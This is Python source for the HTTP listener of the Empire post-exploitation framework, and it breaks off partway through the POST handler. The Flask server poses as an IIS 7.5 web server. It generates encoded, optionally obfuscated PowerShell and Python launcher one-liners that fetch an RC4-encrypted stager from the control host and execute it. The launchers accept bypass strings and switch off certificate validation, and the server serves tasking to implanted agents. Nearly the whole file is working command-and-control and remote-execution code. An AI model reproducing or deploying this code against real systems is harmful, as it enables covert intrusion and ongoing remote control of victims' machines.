from __future__ import print_function

import base64
import copy
import json
import logging
import os
import random
import ssl
import sys
import time
from builtins import object, str
from textwrap import dedent
from typing import List

from flask import Flask, make_response, render_template, request, send_from_directory
from pydispatch import dispatcher
from werkzeug.serving import WSGIRequestHandler

from empire.server.common import encryption, helpers, packets, templating
from empire.server.database import models
from empire.server.database.base import Session
from empire.server.utils import data_util, listener_util


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "HTTP[S]",
            "Author": ["@harmj0y"],
            "Description": (
                "Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach."
            ),
            "Category": ("client_server"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "http://%s" % (helpers.lhost()),
            },
            "BindIP": {
                "Description": "The IP to bind to on the control server.",
                "Required": True,
                "Value": "0.0.0.0",
                "SuggestedValues": ["0.0.0.0"],
                "Strict": False,
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "",
                "SuggestedValues": ["1335", "1336"],
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 5,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            },
            "CertPath": {
                "Description": "Certificate path for https listeners.",
                "Required": False,
                "Value": "",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "Headers": {
                "Description": "Headers for the control server.",
                "Required": True,
                "Value": "Server:Microsoft-IIS/7.5",
            },
            "Cookie": {
                "Description": "Custom Cookie Name",
                "Required": False,
                "Value": "",
            },
            "StagerURI": {
                "Description": "URI for the stager. Must use /download/. Example: /download/stager.php",
                "Required": False,
                "Value": "",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
            "JA3_Evasion": {
                "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
                "Required": True,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.session_cookie = ""

        # check if the current session cookie not empty and then generate random cookie
        if self.session_cookie == "":
            self.options["Cookie"]["Value"] = listener_util.generate_cookie()

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """
        return open(f"{self.template_dir }/default.html", "r").read()

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                print(helpers.color('[!] Option "%s" is required.' % (key)))
                return False

        # If we've selected an HTTPS listener without specifying CertPath, let us know.
        if (
            self.options["Host"]["Value"].startswith("https")
            and self.options["CertPath"]["Value"] == ""
        ):
            print(helpers.color("[!] HTTPS selected but no CertPath specified."))
            return False
        return True

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            print(
                helpers.color(
                    "[!] listeners/http generate_launcher(): no language specified!"
                )
            )

        if (
            listenerName
            and (listenerName in self.threads)
            and (listenerName in self.mainMenu.listeners.activeListeners)
        ):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            host = listenerOptions["Host"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            staging_key = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            uris = [a for a in profile.split("|")[0].split(",")]
            stage0 = random.choice(uris)
            customHeaders = profile.split("|")[2:]

            cookie = listenerOptions["Cookie"]["Value"]
            # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
            if cookie == "":
                generate = listener_util.generate_cookie()
                listenerOptions["Cookie"]["Value"] = generate
                cookie = generate

            if language.startswith("po"):
                # PowerShell
                stager = '$ErrorActionPreference = "SilentlyContinue";'

                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                for bypass in bypasses:
                    stager += bypass

                if safeChecks.lower() == "true":
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"
                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if "https" in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
                stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"

                if userAgent.lower() != "none":
                    stager += f"$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )
                        else:
                            # TODO: implement form for other proxy
                            stager += f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');$wc.Proxy = $proxy;"

                        if proxyCreds.lower() != "none":
                            if proxyCreds.lower() == "default":
                                stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                            else:
                                # TODO: implement form for other proxy credentials
                                username = proxyCreds.split(":")[0]
                                password = proxyCreds.split(":")[1]
                                if len(username.split("\\")) > 1:
                                    usr = username.split("\\")[1]
                                    domain = username.split("\\")[0]
                                    stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"

                                else:
                                    usr = username.split("\\")[0]
                                    stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }');"

                                stager += "$wc.Proxy.Credentials = $netcred;"

                        # save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $wc.Proxy;"

                # TODO: reimplement stager retries?
                # check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions["BindIP"]["Value"]
                port = listenerOptions["Port"]["Value"]
                if ":" in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = (
                                "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
                            )
                        else:
                            host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)

                # code to turn the key string into a byte array
                stager += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
                )

                # this is the minimized RC4 stager code from rc4.ps1
                stager += listener_util.powershell_rc4()

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    staging_key,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket)

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]
                        # If host header defined, assume domain fronting is in use and add a call to the base URL first
                        # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                        if headerKey.lower() == "host":
                            stager += "try{$ig=$wc.DownloadData($ser)}catch{};"
                        stager += (
                            "$wc.Headers.Add("
                            + f"'{headerKey}','"
                            + headerValue
                            + "');"
                        )

                # add the RC4 packet to a cookie
                stager += f'$wc.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
                stager += "$data=$wc.DownloadData($ser+$t);"
                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

                # decode everything and kick it over to IEX to kick off execution
                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                # Remove comments and make one line
                stager = helpers.strip_powershell_comments(stager)
                stager = data_util.ps_convert_to_oneliner(stager)

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith("py"):
                # Python
                launcherBase = "import sys;"
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += dedent(
                        f"""
                        import ssl;
                        if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                        """
                    )

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += listener_util.python_safe_checks()
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print(helpers.color(p, color="red"))

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]

                launcherBase += dedent(
                    f"""
                    import urllib.request;
                    UA='{ userAgent }';server='{ host }';t='{ stage0 }';
                    req=urllib.request.Request(server+t);
                    """
                )

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    staging_key,
                    sessionID="00000000",
                    language="PYTHON",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )

                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]
                        launcherBase += (
                            f'req.add_header("{ headerKey }","{ headerValue }");\n'
                        )

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                    else:
                        proto = proxy.split(":")[0]
                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib.request.build_opener(proxy);\n"

                            # add the RC4 packet to a cookie
                            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
                        else:
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += dedent(
                                f"""
                                proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
                                proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
                                o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
                                """
                            )

                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener();\n"

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o);\n"
                launcherBase += "a=urllib.request.urlopen(req).read();\n"

                # download the stager and extract the IV
                launcherBase += listener_util.python_extract_stager(staging_key)

                if encode:
                    launchEncoded = base64.b64encode(
                        launcherBase.encode("UTF-8")
                    ).decode("UTF-8")
                    if isinstance(launchEncoded, bytes):
                        launchEncoded = launchEncoded.decode("UTF-8")
                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
                    return launcher
                else:
                    return launcherBase

            # very basic csharp implementation
            if language.startswith("csh"):
                workingHours = listenerOptions["WorkingHours"]["Value"]
                killDate = listenerOptions["KillDate"]["Value"]
                customHeaders = profile.split("|")[2:]  # todo: support custom headers
                delay = listenerOptions["DefaultDelay"]["Value"]
                jitter = listenerOptions["DefaultJitter"]["Value"]
                lostLimit = listenerOptions["DefaultLostLimit"]["Value"]

                with open(
                    self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb"
                ) as f:
                    stager_yaml = f.read()
                stager_yaml = stager_yaml.decode("UTF-8")
                stager_yaml = (
                    stager_yaml.replace("{{ REPLACE_ADDRESS }}", host)
                    .replace("{{ REPLACE_SESSIONKEY }}", staging_key)
                    .replace("{{ REPLACE_PROFILE }}", profile)
                    .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
                    .replace("{{ REPLACE_KILLDATE }}", killDate)
                    .replace("{{ REPLACE_DELAY }}", str(delay))
                    .replace("{{ REPLACE_JITTER }}", str(jitter))
                    .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
                )

                compiler = self.mainMenu.loadedPlugins.get("csharpserver")
                if not compiler.status == "ON":
                    print(helpers.color("[!] csharpserver plugin not running"))
                else:
                    file_name = compiler.do_send_stager(
                        stager_yaml, "Sharpire", confuse=obfuscate
                    )
                    return file_name

            else:
                print(
                    helpers.color(
                        "[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
                    )
                )

        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_launcher(): invalid listener name specification!"
                )
            )

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscationCommand="",
        language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """
        if not language:
            print(
                helpers.color(
                    "[!] listeners/http generate_stager(): no language specified!"
                )
            )
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        host = listenerOptions["Host"]["Value"]
        customHeaders = profile.split("|")[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # Get the random function name generated at install and patch the stager with the proper function name
            stager = data_util.keyword_obfuscation(stager)

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # Patch in custom Headers
            remove = []
            if customHeaders != []:
                for key in customHeaders:
                    value = key.split(":")
                    if "cookie" in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ",".join(remove)
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
                )

            stagingKey = stagingKey.encode("UTF-8")
            unobfuscated_stager = listener_util.remove_lines_comments(stager)

            if obfuscate:
                unobfuscated_stager = data_util.obfuscate(
                    self.mainMenu.installPath,
                    unobfuscated_stager,
                    obfuscationCommand=obfuscationCommand,
                )
            # base64 encode the stager and return it
            # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
            # if/else statements are irrelevant
            if encode:
                return helpers.enc_powershell(unobfuscated_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
                )
            else:
                return unobfuscated_stager

        elif language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)

                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                )
            else:
                # otherwise return the standard stager
                return stager

        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                )
            )

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscationCommand="",
        version="",
    ):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/http generate_agent(): no language specified!"
                )
            )
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":

            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            # Get the random function name generated at install and patch the stager with the proper function name
            code = data_util.keyword_obfuscation(code)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", f"$AgentDelay = { delay }")
            code = code.replace("$AgentJitter = 0", f"$AgentJitter = { jitter}")
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'$Profile = "{ profile }"',
            )
            code = code.replace("$LostLimit = 60", f"$LostLimit = { lostLimit }")
            code = code.replace(
                '$DefaultResponse = ""',
                f'$DefaultResponse = "{ b64DefaultResponse.decode("UTF-8") }"',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace("$KillDate,", f"$KillDate = '{ killDate }',")
            if obfuscate:
                code = data_util.obfuscate(
                    self.mainMenu.installPath,
                    code,
                    obfuscationCommand=obfuscationCommand,
                )
            return code

        elif language == "python":
            if version == "ironpython":
                f = open(self.mainMenu.installPath + "/data/agent/ironpython_agent.py")
            else:
                f = open(self.mainMenu.installPath + "/data/agent/agent.py")
            code = f.read()
            f.close()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay = 60", f"delay = { delay }")
            code = code.replace("jitter = 0.0", f"jitter = { jitter }")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{ profile }"',
            )
            code = code.replace("lostLimit = 60", f"lostLimit = { lostLimit }")
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{ b64DefaultResponse.decode("UTF-8") }")',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    'killDate = "REPLACE_KILLDATE"', f'killDate = "{ killDate }"'
                )
            if workingHours != "":
                code = code.replace(
                    'workingHours = "REPLACE_WORKINGHOURS"',
                    f'workingHours = "{ killDate }"',
                )

            return code
        elif language == "csharp":
            # currently the agent is stagless so do nothing
            code = ""
            return code
        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
                )
            )

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        host = listenerOptions["Host"]["Value"]

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/http.ps1")

                template_options = {
                    "session_cookie": self.session_cookie,
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            elif language.lower() == "python":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]
                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/comms.py")

                template_options = {
                    "session_cookie": self.session_cookie,
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            else:
                print(
                    helpers.color(
                        "[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_comms(): no language specified!"
                )
            )

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions["BindIP"]["Value"]
        port = listenerOptions["Port"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        stagerURI = listenerOptions["StagerURI"]["Value"]
        userAgent = listenerOptions["UserAgent"]["Value"]
        listenerName = listenerOptions["Name"]["Value"]
        proxy = listenerOptions["Proxy"]["Value"]
        proxyCreds = listenerOptions["ProxyCreds"]["Value"]

        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
        app = Flask(__name__, template_folder=self.template_dir)
        self.app = app

        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
        WSGIRequestHandler.protocol_version = "HTTP/1.1"

        @app.route("/download/<stager>/")
        @app.route("/download/<stager>/<options>")
        def send_stager(stager, options=None):
            if "po" in stager:
                if options:
                    options = base64.b64decode(options).decode("UTF-8")
                    options = options.split(":")

                    obfuscate_command = options[0]
                    bypasses = options[1]

                    if obfuscate_command:
                        obfuscate = True
                    else:
                        obfuscate = False

                    if not bypasses:
                        bypasses = ""

                    launcher = self.mainMenu.stagers.generate_launcher(
                        listenerName=listenerName,
                        language="powershell",
                        encode=False,
                        userAgent=userAgent,
                        proxy=proxy,
                        proxyCreds=proxyCreds,
                        obfuscate=obfuscate,
                        obfuscationCommand=obfuscate_command,
                        bypasses=bypasses,
                    )
                    return launcher

                else:
                    launcher = self.mainMenu.stagers.generate_launcher(
                        listenerName=listenerName,
                        language="powershell",
                        encode=False,
                        userAgent=userAgent,
                        proxy=proxy,
                        proxyCreds=proxyCreds,
                    )
                    return launcher

            elif "py" in stager:
                launcher = self.mainMenu.stagers.generate_launcher(
                    listenerName,
                    language="python",
                    encode=False,
                    userAgent=userAgent,
                    proxy=proxy,
                    proxyCreds=proxyCreds,
                )
                return launcher

            else:
                return make_response(self.default_response(), 404)

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                listenerName = self.options["Name"]["Value"]
                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(
                    request.remote_addr
                )
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                return make_response(self.default_response(), 404)

        @app.after_request
        def change_header(response):
            """
            Modify the headers response server.
            """
            headers = listenerOptions["Headers"]["Value"]
            for key in headers.split("|"):
                value = key.split(":")
                response.headers[value[0]] = value[1]
            return response

        @app.after_request
        def add_proxy_headers(response):
            """
            Add HTTP headers to avoid proxy caching.
            """
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            return response

        @app.errorhandler(405)
        def handle_405(e):
            """
            Returns IIS 7.5 405 page for every Flask 405 error.
            """
            return render_template("method_not_allowed.html"), 405

        @app.route("/")
        @app.route("/iisstart.htm")
        def serve_index():
            """
            Return default server web page if user navigates to index.
            """
            return render_template("index.html"), 200

        @app.route("/<path:request_uri>", methods=["GET"])
        def handle_get(request_uri):
            """
            Handle an agent GET request.
            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """
            if request_uri.lower() == "welcome.png":
                # Serves image loaded by index page.
                #
                # Thanks to making it case-insensitive it works the same way as in
                # an actual IIS server
                static_dir = self.mainMenu.installPath + "/data/misc/"
                return send_from_directory(static_dir, "welcome.png")

            clientIP = request.remote_addr

            # Get the request User-Agent to customize the agent profile
            listenerName = self.options['Name']['Value']
            clientUserAgent = request.headers['User-Agent']
            message = "[!] GET with user-agent {} from {}".format(clientUserAgent, clientIP)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
            defaultUserAgent = listenerOptions['DefaultProfile']['Value'].split('|')[1]
            if clientUserAgent and clientUserAgent != defaultUserAgent:
                newProfile = listenerOptions['DefaultProfile']['Value'].split('|')[0] + '|' + clientUserAgent
                message = "[!] GET New listenerOptions {} for {}".format(newProfile, listenerName)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                listenerOptions['DefaultProfile']['Value'] = newProfile

            listenerName = self.options['Name']['Value']
            message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

            routingPacket = None
            cookie = request.headers.get("Cookie")

            if cookie and cookie != "":
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                    if self.session_cookie in cookie:
                        listenerName = self.options["Name"]["Value"]
                        message = "[*] GET cookie value from {} : {}".format(
                            clientIP, cookie
                        )
                        signal = json.dumps({"print": False, "message": message})
                        dispatcher.send(
                            signal, sender="listeners/http/{}".format(listenerName)
                        )
                        cookieParts = cookie.split(";")
                        for part in cookieParts:
                            if part.startswith(self.session_cookie):
                                base64RoutingPacket = part[part.find("=") + 1 :]
                                # decode the routing packet base64 value in the cookie
                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception as e:
                    routingPacket = None
                    pass

            if routingPacket:
                # parse the routing packet and process the results

                dataResults = self.mainMenu.agents.handle_agent_data(
                    stagingKey, routingPacket, listenerOptions, clientIP
                )
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if isinstance(results, str):
                                results = results.encode("UTF-8")
                            if results == b"STAGE0":
                                # handle_agent_data() signals that the listener should return the stager.ps1 code
                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                listenerName = self.options["Name"]["Value"]
                                message = (
                                    "[*] Sending {} stager (stage 1) to {}".format(
                                        language, clientIP
                                    )
                                )
                                signal = json.dumps({"print": True, "message": message})
                                dispatcher.send(
                                    signal,
                                    sender="listeners/http/{}".format(listenerName),
                                )
                                stage = self.generate_stager(
                                    language=language,
                                    listenerOptions=listenerOptions,
                                    obfuscate=self.mainMenu.obfuscate,
                                    obfuscationCommand=self.mainMenu.obfuscateCommand,
                                )
                                return make_response(stage, 200)

                            elif results.startswith(b"ERROR:"):
                                listenerName = self.options["Name"]["Value"]
                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
                                    request_uri, clientIP, results
                                )
                                signal = json.dumps({"print": True, "message": message})
                                dispatcher.send(
                                    signal,
                                    sender="listeners/http/{}".format(listenerName),
                                )

                                if b"not in cache" in results:
                                    # signal the client to restage
                                    print(
                                        helpers.color(
                                            "[*] Orphaned agent from %s, signaling restaging"
                                            % (clientIP)
                                        )
                                    )
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)

                            else:
                                # actual taskings
                                listenerName = self.options["Name"]["Value"]
                                message = "[*] Agent from {} retrieved taskings".format(
                                    clientIP
                                )
                                signal = json.dumps(
                                    {"print": False, "message": message}
                                )
                                dispatcher.send(
                                    signal,
                                    sender="listeners/http/{}".format(listenerName),
                                )
                                return make_response(results, 200)
                        else:
                            # dispatcher.send("[!] Results are None...", sender='listeners/http')
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200)

            else:
                listenerName = self.options["Name"]["Value"]
                message = "[!] {} requested by {} with no routing packet.".format(
                    request_uri, clientIP
                )
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                return make_response(self.default_response(), 404)

        @app.route("/<path:request_uri>", methods=["POST"])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """
            stagingKey = listenerOptions["StagingKey"]["Value"]
            clientIP = request.remote_addr


